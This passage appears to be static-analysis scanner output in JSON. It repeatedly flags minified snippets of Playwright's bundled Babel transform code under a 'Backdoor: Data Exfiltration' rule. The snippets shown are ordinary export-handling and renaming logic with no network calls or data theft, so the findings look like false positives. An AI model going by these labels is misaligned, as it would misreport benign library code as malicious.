                    "text": "ueueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce",
                    "rendered": {
                      "text": "ueueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce",
                      "markdown": "`ueueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.rename(s);return(t||[]).reduce`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 15033,
                  "endLine": 1635,
                  "endColumn": 15038,
                  "snippet": {
                    "text": "iableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.ren",
                    "rendered": {
                      "text": "iableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.ren",
                      "markdown": "`iableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has(l)){let u=Ro(oi(n,r.get(l),Ps(l),e.scope));u._blockHoist=e.node._blockHoist,t(e.insertAfter(u)[0])}}}},oi=(e,t,r,n)=>{let s=e.exportName;for(let i=n;i!=null;i=i.parent)i.hasOwnBinding(s)&&i.ren`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 14839,
                  "endLine": 1635,
                  "endColumn": 14844,
                  "snippet": {
                    "text": "de;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has",
                    "rendered": {
                      "text": "de;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has",
                      "markdown": "`de;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)&&!qfe(o)&&(!Vfe(o)||o.id)&&(!Ufe(o)||o.id)){if(!o){if(s)continue;o=e.scope.buildUndefinedNode()}i.node.init=oi(n,r.get(a.name),o,e.scope),t(i.get(\"init\"))}else for(let l of Object.keys(i.getOuterBindingIdentifiers()))if(r.has`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 14613,
                  "endLine": 1635,
                  "endColumn": 14618,
                  "snippet": {
                    "text": "m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip()},ClassDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,{id:s}=e.node;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)",
                    "rendered": {
                      "text": "m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip()},ClassDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,{id:s}=e.node;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)",
                      "markdown": "`m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip()},ClassDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,{id:s}=e.node;if(!s)throw new Error(\"Expected class to have a name\");let i=s.name,a=r.get(i)||[];if(a.length>0){let o=Ro(oi(n,a,Ps(i),e.scope));o._blockHoist=e.node._blockHoist,t(e.insertAfter(o)[0])}},VariableDeclaration(e){let{requeueInParent:t,exported:r,metadata:n}=this,s=e.node.kind===\"var\";for(let i of e.get(\"declarations\")){let{id:a}=i.node,{init:o}=i.node;if($fe(a)&&r.has(a.name)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 14149,
                  "endLine": 1635,
                  "endColumn": 14154,
                  "snippet": {
                    "text": "a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s,buildImportReference([u,c,f],p){let m=t.source.get(u);if(m.referenced=!0,f){if(m.wrap){var b;p=(b=r(p,m.wrap))!=null?b:p}return p}let d=Ps(m.name);if(m.wrap){var y;d=(y=r(d,m.wrap))!=null?y:d}if(c===\"default\"&&m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip",
                    "rendered": {
                      "text": "a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s,buildImportReference([u,c,f],p){let m=t.source.get(u);if(m.referenced=!0,f){if(m.wrap){var b;p=(b=r(p,m.wrap))!=null?b:p}return p}let d=Ps(m.name);if(m.wrap){var y;d=(y=r(d,m.wrap))!=null?y:d}if(c===\"default\"&&m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip",
                      "markdown": "`a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s,buildImportReference([u,c,f],p){let m=t.source.get(u);if(m.referenced=!0,f){if(m.wrap){var b;p=(b=r(p,m.wrap))!=null?b:p}return p}let d=Ps(m.name);if(m.wrap){var y;d=(y=r(d,m.wrap))!=null?y:d}if(c===\"default\"&&m.interop===\"node-default\")return d;let v=t.stringSpecifiers.has(c);return VC(d,v?$C(c):Ps(c),v)}};e.traverse(Qfe,l)}var zfe={Scope(e){e.skip`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 13797,
                  "endLine": 1635,
                  "endColumn": 13802,
                  "snippet": {
                    "text": "rentPath.isStatement()||e.parentPath.isExpression())return!1}while(e=e.parentPath)}function Jfe(e,t,r){let n=new Map,s=new Map,i=u=>{e.requeue(u)};for(let[u,c]of t.source){for(let[f,p]of c.imports)n.set(f,[u,p,null]);for(let f of c.importsNamespace)n.set(f,[u,null,f])}for(let[u,c]of t.local){let f=s.get(u);f||(f=[],s.set(u,f)),f.push(...c.names)}let a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s",
                    "rendered": {
                      "text": "rentPath.isStatement()||e.parentPath.isExpression())return!1}while(e=e.parentPath)}function Jfe(e,t,r){let n=new Map,s=new Map,i=u=>{e.requeue(u)};for(let[u,c]of t.source){for(let[f,p]of c.imports)n.set(f,[u,p,null]);for(let f of c.importsNamespace)n.set(f,[u,null,f])}for(let[u,c]of t.local){let f=s.get(u);f||(f=[],s.set(u,f)),f.push(...c.names)}let a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s",
                      "markdown": "`rentPath.isStatement()||e.parentPath.isExpression())return!1}while(e=e.parentPath)}function Jfe(e,t,r){let n=new Map,s=new Map,i=u=>{e.requeue(u)};for(let[u,c]of t.source){for(let[f,p]of c.imports)n.set(f,[u,p,null]);for(let f of c.importsNamespace)n.set(f,[u,null,f])}for(let[u,c]of t.local){let f=s.get(u);f||(f=[],s.set(u,f)),f.push(...c.names)}let a={metadata:t,requeueInParent:i,scope:e.scope,exported:s};e.traverse(zfe,a);let o=new Set([...Array.from(n.keys()),...Array.from(s.keys())]);(0,Mfe.default)(e,o,!1);let l={seen:new WeakSet,metadata:t,requeueInParent:i,scope:e.scope,imported:n,exported:s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 11982,
                  "endLine": 1635,
                  "endColumn": 11987,
                  "snippet": {
                    "text": ";let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator=\"=\")}}};MC.UpdateExpression={exit(e){if(!this.includeUpdateExpression)return;let{scope:t,bindingNames:r}=this,n=e.get(\"argument\");if(!n.isIdentifier())return;let s=n.node.name;if(r.has(s)&&t.getBinding(s)===e.scope.getBinding(s))if(e.parentPath.isExpressionStatement()&&!e.isCompletionRecord()){let i=e.node.operator==\"++\"?\"+=\":\"-=\";e.replaceWith(jo(i,n.node,B0(1)))}else if(e.node.prefix)e.replaceWith(jo(\"=\",yc(s),F0",
                    "rendered": {
                      "text": ";let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator=\"=\")}}};MC.UpdateExpression={exit(e){if(!this.includeUpdateExpression)return;let{scope:t,bindingNames:r}=this,n=e.get(\"argument\");if(!n.isIdentifier())return;let s=n.node.name;if(r.has(s)&&t.getBinding(s)===e.scope.getBinding(s))if(e.parentPath.isExpressionStatement()&&!e.isCompletionRecord()){let i=e.node.operator==\"++\"?\"+=\":\"-=\";e.replaceWith(jo(i,n.node,B0(1)))}else if(e.node.prefix)e.replaceWith(jo(\"=\",yc(s),F0",
                      "markdown": "`;let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator=\"=\")}}};MC.UpdateExpression={exit(e){if(!this.includeUpdateExpression)return;let{scope:t,bindingNames:r}=this,n=e.get(\"argument\");if(!n.isIdentifier())return;let s=n.node.name;if(r.has(s)&&t.getBinding(s)===e.scope.getBinding(s))if(e.parentPath.isExpressionStatement()&&!e.isCompletionRecord()){let i=e.node.operator==\"++\"?\"+=\":\"-=\";e.replaceWith(jo(i,n.node,B0(1)))}else if(e.node.prefix)e.replaceWith(jo(\"=\",yc(s),F0`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 11563,
                  "endLine": 1635,
                  "endColumn": 11568,
                  "snippet": {
                    "text": "assignmentExpression:jo,binaryExpression:F0,cloneNode:j0,identifier:yc,logicalExpression:Bfe,numericLiteral:B0,sequenceExpression:Ffe,unaryExpression:LC}=Nfe,MC={AssignmentExpression:{exit(e){let{scope:t,seen:r,bindingNames:n}=this;if(e.node.operator===\"=\"||r.has(e.node))return;r.add(e.node);let s=e.get(\"left\");if(!s.isIdentifier())return;let i=s.node.name;if(!n.has(i)||t.getBinding(i)!==e.scope.getBinding(i))return;let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator",
                    "rendered": {
                      "text": "assignmentExpression:jo,binaryExpression:F0,cloneNode:j0,identifier:yc,logicalExpression:Bfe,numericLiteral:B0,sequenceExpression:Ffe,unaryExpression:LC}=Nfe,MC={AssignmentExpression:{exit(e){let{scope:t,seen:r,bindingNames:n}=this;if(e.node.operator===\"=\"||r.has(e.node))return;r.add(e.node);let s=e.get(\"left\");if(!s.isIdentifier())return;let i=s.node.name;if(!n.has(i)||t.getBinding(i)!==e.scope.getBinding(i))return;let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator",
                      "markdown": "`assignmentExpression:jo,binaryExpression:F0,cloneNode:j0,identifier:yc,logicalExpression:Bfe,numericLiteral:B0,sequenceExpression:Ffe,unaryExpression:LC}=Nfe,MC={AssignmentExpression:{exit(e){let{scope:t,seen:r,bindingNames:n}=this;if(e.node.operator===\"=\"||r.has(e.node))return;r.add(e.node);let s=e.get(\"left\");if(!s.isIdentifier())return;let i=s.node.name;if(!n.has(i)||t.getBinding(i)!==e.scope.getBinding(i))return;let a=e.node.operator.slice(0,-1);kfe.includes(a)?e.replaceWith(Bfe(a,e.node.left,jo(\"=\",j0(e.node.left),e.node.right))):(e.node.right=F0(a,j0(e.node.left),e.node.right),e.node.operator`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 9857,
                  "endLine": 1635,
                  "endColumn": 9862,
                  "snippet": {
                    "text": "|a):n?D.var(d):s&&(c?D.var(a).read(d):D.var(d).prop(r)))}else throw new Error(`Unknown importedInterop \"${l}\".`)}let{statements:O,resultName:_}=D.done();return this._insertStatements(O,m,b),(n||s)&&f&&_.type!==\"Identifier\"?Tfe([vfe(0),_]):_}_insertStatements(t,r=\"before\",n=3){let s=this._programPath.get(\"body\");if(r===\"after\"){for(let i=s.length-1;i>=0;i--)if(s[i].isImportDeclaration()){s[i].insertAfter(t);return}}else{t.forEach(a=>{a._blockHoist=n});let i=s.find(a=>{let o=a.node._blockHoist;return Number.isFinite(o)&&o<4});if(i){i.insertBefore(t);return}}this._programPath.unshiftContainer(\"body\",t",
                    "rendered": {
                      "text": "|a):n?D.var(d):s&&(c?D.var(a).read(d):D.var(d).prop(r)))}else throw new Error(`Unknown importedInterop \"${l}\".`)}let{statements:O,resultName:_}=D.done();return this._insertStatements(O,m,b),(n||s)&&f&&_.type!==\"Identifier\"?Tfe([vfe(0),_]):_}_insertStatements(t,r=\"before\",n=3){let s=this._programPath.get(\"body\");if(r===\"after\"){for(let i=s.length-1;i>=0;i--)if(s[i].isImportDeclaration()){s[i].insertAfter(t);return}}else{t.forEach(a=>{a._blockHoist=n});let i=s.find(a=>{let o=a.node._blockHoist;return Number.isFinite(o)&&o<4});if(i){i.insertBefore(t);return}}this._programPath.unshiftContainer(\"body\",t",
                      "markdown": "`|a):n?D.var(d):s&&(c?D.var(a).read(d):D.var(d).prop(r)))}else throw new Error(`Unknown importedInterop \"${l}\".`)}let{statements:O,resultName:_}=D.done();return this._insertStatements(O,m,b),(n||s)&&f&&_.type!==\"Identifier\"?Tfe([vfe(0),_]):_}_insertStatements(t,r=\"before\",n=3){let s=this._programPath.get(\"body\");if(r===\"after\"){for(let i=s.length-1;i>=0;i--)if(s[i].isImportDeclaration()){s[i].insertAfter(t);return}}else{t.forEach(a=>{a._blockHoist=n});let i=s.find(a=>{let o=a.node._blockHoist;return Number.isFinite(o)&&o<4});if(i){i.insertBefore(t);return}}this._programPath.unshiftContainer(\"body\",t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 2837,
                  "endLine": 1635,
                  "endColumn": 2842,
                  "snippet": {
                    "text": ".forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.scope.rename(O,m[O])});for(let O of v)O.remove();for(let O of I){let _=rfe(p[O.node.name]);O.replaceWith(_)}}var T0=Objec",
                    "rendered": {
                      "text": ".forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.scope.rename(O,m[O])});for(let O of v)O.remove();for(let O of I){let _=rfe(p[O.node.name]);O.replaceWith(_)}}var T0=Objec",
                      "markdown": "`.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.scope.rename(O,m[O])});for(let O of v)O.remove();for(let O of I){let _=rfe(p[O.node.name]);O.replaceWith(_)}}var T0=Objec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1635,
                  "startColumn": 2718,
                  "endLine": 1635,
                  "endColumn": 2723,
                  "snippet": {
                    "text": "Each((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.sc",
                    "rendered": {
                      "text": "Each((O,_)=>{p[_.name]=typeof s==\"function\"&&s(O)||_});let m={},b=new Set(n||[]);r.type===\"Identifier\"&&b.add(r.name),i.forEach(O=>{let _=O;for(;b.has(_);)_=\"_\"+_;_!==O&&(m[O]=_)}),r.type===\"Identifier\"&&u!==r.name&&(m[u]=r.name);let{path:d}=e,y=d.get(l),v=f.map(O=>d.get(O)),I=c.map(O=>d.get(O)),D=y.get(\"declaration\");if(r.type===\"Identifier\")y.replaceWith(D);else if(r.type===\"MemberExpression\")o.forEach(O=>{let _=d.get(O);_.replaceWith(wC(\"=\",r,_.node))}),y.replaceWith(D),d.pushContainer(\"body\",nfe(wC(\"=\",r,sfe(u))));else throw new Error(\"Unexpected helper format.\");Object.keys(m).forEach(O=>{d.sc",
